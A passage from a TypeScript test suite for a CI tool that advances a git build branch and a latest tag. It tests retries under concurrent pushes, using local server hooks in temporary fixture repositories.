  test("a push overtaken by another run is retried on the new tip", () => {
    const fx = seedFixture();
    const rival = competitors(fx, 1);
    let result: ReturnType<typeof advanceBuild> | undefined;
    const pushes = withPushPlans(fx, rival.plans, () => {
      result = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
    });
    expectRetriedOnto(fx, "", rival.first, result, pushes);
  });

  // The rival lands DURING the push: origin's update hook moves build after receive-pack advertised it, so the update fails its own compare-and-set.
  // git words that differently for a ref created since ("reference already exists") and one moved since ("is at ... but expected").
  const raced: [string, boolean][] = [
    ["created", false],
    ["moved", true],
  ];
  test.each(raced)(
    "a push whose ref the server finds %s since advertising it is retried",
    (_name, preexisting) => {
      const fx = seedFixture();
      const rival = competitors(fx, preexisting ? 2 : 1);
      git(rival.from, "push", "--quiet", "origin", `${rival.last}:refs/heads/rival`);
      if (preexisting) {
        git(rival.from, "push", "--quiet", "origin", `${rival.first}:refs/heads/build`);
      }
      const hooks = join(fx.origin, "hooks");
      mkdirSync(hooks, { recursive: true });
      writeFileSync(
        join(hooks, "update"),
        `#!/bin/sh\n[ "$1" = refs/heads/build ] || exit 0\ngit update-ref refs/heads/build ${rival.last}\n`,
        { mode: 0o755 },
      );
      git(fx.origin, "config", "core.hooksPath", hooks);
      let result: ReturnType<typeof advanceBuild> | undefined;
      const pushes = withPushPlans(fx, [], () => {
        result = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
      });
      expectRetriedOnto(fx, preexisting ? rival.first : "", rival.last, result, pushes);
    },
  );

  test("GitHub's wording of that server-side compare-and-set loss is retried too", () => {
    const fx = seedFixture();
    const stderr = `To https://github.com/o/r.git\n ! [remote rejected] 0123abc -> build (cannot lock ref 'refs/heads/build': is at ${fx.seedSha} but expected ${fx.mergeSha})\nerror: failed to push some refs to 'https://github.com/o/r.git'\n`;
    let result: ReturnType<typeof advanceBuild> | undefined;
    // The scripted loss lands nothing, so the retry finds no build and pushes the root package again, for real.
    const pushes = withPushPlans(fx, [{ fail: { stderr, status: 1 } }], () => {
      result = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
    });
    const tip = buildTip(fx);
    expect(result).toEqual({ changed: true, buildSha: tip, latestSha: tip, reason: advanced(tip) });
    const rejected = appendedSha(pushes[0] ?? []);
    expect(pushes).toEqual([appendOf(rejected), appendOf(tip), latestOf("", tip)]);
    expect(parentOf(fx.work, rejected)).toBe("");
    expect(parentOf(fx.origin, tip)).toBe("");
  });

  test("a push overtaken on every attempt gives up naming the concurrent mover", () => {
    const fx = seedFixture();
    const rival = competitors(fx, 3);
    const pushes = withPushPlans(fx, rival.plans, () => {
      expect(() => advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha })).toThrow(
        "could not advance refs/heads/build after 3 attempts; something keeps moving it concurrently - rerun this job once it settles.",
      );
    });
    const shas = pushes.map(appendedSha);
    expect(pushes).toEqual(shas.map(appendOf));
    expect(shas.map((sha) => parentOf(fx.work, sha))).toEqual(["", ...rival.shas.slice(0, -1)]);
    expect(buildTip(fx)).toBe(rival.last);
    expect(remoteRef(fx, "refs/tags/latest")).toBe("");
  });

  test.each(PERMANENT)(
    "%s fails the first push for good, with git's own words",
    (_name, stderr) => {
      const fx = seedFixture();
      let error: unknown;
      const pushes = withPushPlans(fx, [{ fail: { stderr, status: 128 } }], () => {
        try {
          advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
        } catch (thrown) {
          error = thrown;
        }
      });
      const shas = pushes.map(appendedSha);
      expect(pushes).toEqual(shas.map(appendOf));
      expect(shas.map((sha) => parentOf(fx.work, sha))).toEqual([""]);
      expect(error).toEqual(
        new Error(`git push origin ${shas.join()}:refs/heads/build failed: ${stderr.trim()}`),
      );
      expect(remoteRef(fx, "refs/heads/build")).toBe("");
      expect(remoteRef(fx, "refs/tags/latest")).toBe("");
    },
  );

  describe("the latest tag", () => {
    test("a release backfilled behind a newer commit whose run lost its latest push publishes the newer commit", () => {
      const fx = seedFixture();
      // Post-green skipped the 2.1.0 merge; the next green commit's run appended it and then lost the latest push for
      // good, so build holds a newer source than anything latest names.
      const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
      const stderr = PERMANENT[0]?.[1] ?? "";
      expect(() =>
        withPushPlans(fx, [null, { fail: { stderr, status: 128 } }], () => {
          advanceBuild({ cwd: next.dir, sourceSha: next.sha });
        }),
      ).toThrow(/refs\/tags\/latest failed/);
      const newer = buildTip(fx);
      expect(sourceTrailer(fx.origin, newer)).toBe(next.sha);
      expect(remoteRef(fx, "refs/tags/latest")).toBe("");
      const release = checkoutOf(fx, "release-backfill", fx.mergeSha, "packaged-bundle-bytes-1\n");
      let result: ReturnType<typeof packageRelease> | undefined;
      const pushes = withPushPlans(fx, [], () => {
        result = packageRelease({ cwd: release, tag: "v2.1.0", sourceSha: fx.mergeSha });
      });
      const older = buildTip(fx);
      expect(parentOf(fx.origin, older)).toBe(newer);
      expect(result).toEqual({ created: true, packagedSha: older, latestSha: newer });
      expect(pushes).toEqual([appendOf(older), TAG_PUSH, latestOf("", newer)]);
      expect(latestTag(fx)).toBe(newer);
      const rerun = checkoutOf(fx, "release-rerun", fx.mergeSha, "packaged-bundle-bytes-1\n");
      let verified: ReturnType<typeof packageRelease> | undefined;
      const rerunPushes = withPushPlans(fx, [], () => {
        verified = packageRelease({ cwd: rerun, tag: "v2.1.0", sourceSha: fx.mergeSha });
      });
      expect(verified).toEqual({ created: false, packagedSha: older, latestSha: newer });
      expect(rerunPushes).toEqual([]);
    });

    test("a release backfill landing between this run's append and its latest move does not hide this run's newer commit", () => {
      const fx = seedFixture();
      // latest names the seed's package; the 2.1.0 merge was skipped by post-green.
      const older = advanceBuild({
        cwd: checkoutOf(fx, "seed-run", fx.seedSha, "packaged-bundle-bytes-0\n"),
        sourceSha: fx.seedSha,
      }).buildSha;
      const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
      // origin's post-receive hook appends the release hook's backfill of the merge commit on top of this run's append, so the tip this run reads
      // next is the backfill.
      const rival = clone(fx.root, fx.origin, "backfill");
      git(rival, "checkout", "--quiet", fx.mergeSha);
      stripWorkflows(rival);
      writeBuild(rival, "packaged-bundle-bytes-1\n");
      stageBuild(rival);
      stripPrepare(rival);
      const rivalTree = git(rival, "write-tree");
      // The tree's objects must already sit in origin for the hook to commit them.
      const holder = git(rival, "commit-tree", rivalTree, "-p", fx.mergeSha, "-m", "holder");
      git(rival, "push", "--quiet", "origin", `${holder}:refs/heads/backfill-objects`);
      const hooks = join(fx.origin, "hooks");
      const once = join(fx.root, "backfilled");
      mkdirSync(hooks, { recursive: true });
      writeFileSync(
        join(hooks, "post-receive"),
        [
          "#!/bin/sh",
          `[ -e "${once}" ] && exit 0`,
          "while read -r old new ref; do",
          '  [ "$ref" = refs/heads/build ] || continue',
          `  : > "${once}"`,
          `  sha=$(git -c user.name=hook -c user.email=hook@example.invalid commit-tree ${rivalTree} -p "$new" -m "build: by the release hook" -m "Source: ${fx.mergeSha}")`,
          '  git update-ref refs/heads/build "$sha" "$new"',
          "done",
          "",
        ].join("\n"),
        { mode: 0o755 },
      );
      git(fx.origin, "config", "core.hooksPath", hooks);
      let result: ReturnType<typeof advanceBuild> | undefined;
      const pushes = withPushPlans(fx, [], () => {
        result = advanceBuild({ cwd: next.dir, sourceSha: next.sha });
      });
      const tip = buildTip(fx);
      const own = git(fx.origin, "rev-parse", `${tip}^`);
      expect(sourceTrailer(fx.origin, tip)).toBe(fx.mergeSha);
      expect(sourceTrailer(fx.origin, own)).toBe(next.sha);
      expect(git(fx.origin, "rev-parse", `${own}^`)).toBe(older);
      expect(result).toEqual({
        changed: true,
        buildSha: own,
        latestSha: own,
        reason: `refs/heads/build: advanced to ${own}; refs/tags/latest: moved to ${own}`,
      });
      expect(pushes).toEqual([appendOf(own), latestOf(older, own)]);
      expect(latestTag(fx)).toBe(own);
      const rerun = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
      expect(rerun).toEqual({
        changed: false,
        buildSha: tip,
        latestSha: own,
        reason: `refs/heads/build already packages ${fx.mergeSha} at ${tip}; refs/tags/latest already at ${own}`,
      });
      expect(latestTag(fx)).toBe(own);
    });

    test("a stale rerun after the release hook appended an older source leaves latest on the newer source until a green push passes it", () => {
      const fx = seedFixture();
      // Post-green skipped the 2.1.0 merge; the next green commit reached build first.
      const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
      const newer = advanceBuild({ cwd: next.dir, sourceSha: next.sha }).buildSha;
      const release = checkoutOf(fx, "release-backfill", fx.mergeSha, "packaged-bundle-bytes-1\n");
      const older = packageRelease({
        cwd: release,
        tag: "v2.1.0",
        sourceSha: fx.mergeSha,
      }).packagedSha;
      expect(buildTip(fx)).toBe(older);
      expect(latestTag(fx)).toBe(newer);
      let result: ReturnType<typeof advanceBuild> | undefined;
      const pushes = withPushPlans(fx, [], () => {
        result = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
      });
      expect(result).toEqual({
        changed: false,
        buildSha: older,
        latestSha: newer,
        reason: `refs/heads/build already packages ${fx.mergeSha} at ${older}; refs/tags/latest already at ${newer}`,
      });
      expect(pushes).toEqual([]);
      expect(latestTag(fx)).toBe(newer);
      const third = pushGreenCommit(fx, "third-green", "packaged-bundle-bytes-3\n");
      const moved = advanceBuild({ cwd: third.dir, sourceSha: third.sha });
      expect(moved).toEqual({
        changed: true,
        buildSha: buildTip(fx),
        latestSha: buildTip(fx),
        reason: advanced(buildTip(fx)),
      });
      expect(git(fx.origin, "rev-parse", `${buildTip(fx)}^`)).toBe(older);
      expect(latestTag(fx)).toBe(buildTip(fx));
    });

    test("a lease overtaken by another mover is retried on the re-observed tag", () => {
      const fx = seedFixture();
      const first = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
      const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
      let result: ReturnType<typeof advanceBuild> | undefined;
      const pushes = withPushPlans(
        fx,
        [null, { competitor: { from: fx.work, sha: fx.seedSha, ref: "refs/tags/latest" } }],
        () => {
          result = advanceBuild({ cwd: next.dir, sourceSha: next.sha });
        },
      );
      const tip = buildTip(fx);
      expect(result).toEqual({
        changed: true,
        buildSha: tip,
        latestSha: tip,
        reason: advanced(tip),
      });
      expect(pushes).toEqual([appendOf(tip), latestOf(first, tip), latestOf(fx.seedSha, tip)]);
      expect(latestTag(fx)).toBe(tip);
    });

    test("a lease overtaken on every attempt gives up after build advanced", () => {
      const fx = seedFixture();
      advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
      const next = pushGreenCommit(fx, "second-green", "packaged-bundle-bytes-2\n");
      const movers = [fx.seedSha, fx.mergeSha, fx.seedSha];
      const pushes = withPushPlans(
        fx,
        [
          null,
          ...movers.map((sha) => ({ competitor: { from: fx.work, sha, ref: "refs/tags/latest" } })),
        ],
        () => {
          expect(() => advanceBuild({ cwd: next.dir, sourceSha: next.sha })).toThrow(
            "could not move refs/tags/latest after 3 compare-and-swap attempts; something keeps moving it concurrently - rerun this job once it settles.",
          );
        },
      );
      const tip = buildTip(fx);
      expect(sourceTrailer(fx.origin, tip)).toBe(next.sha);
      const first = git(fx.origin, "rev-parse", `${tip}^`);
      expect(pushes).toEqual([
        appendOf(tip),
        latestOf(first, tip),
        latestOf(fx.seedSha, tip),
        latestOf(fx.mergeSha, tip),
      ]);
      expect(latestTag(fx)).toBe(fx.seedSha);
    });

    test.each(PERMANENT)(
      "%s fails the first lease push for good, after build advanced",
      (_name, stderr) => {
        const fx = seedFixture();
        let error: unknown;
        const pushes = withPushPlans(fx, [null, { fail: { stderr, status: 128 } }], () => {
          try {
            advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
          } catch (thrown) {
            error = thrown;
          }
        });
        const tip = buildTip(fx);
        expect(pushes).toEqual([appendOf(tip), latestOf("", tip)]);
        expect(error).toEqual(
          new Error(
            `git push --force-with-lease=refs/tags/latest: origin ${tip}:refs/tags/latest failed: ${stderr.trim()}`,
          ),
        );
        expect(remoteRef(fx, "refs/tags/latest")).toBe("");
      },
    );
  });
});
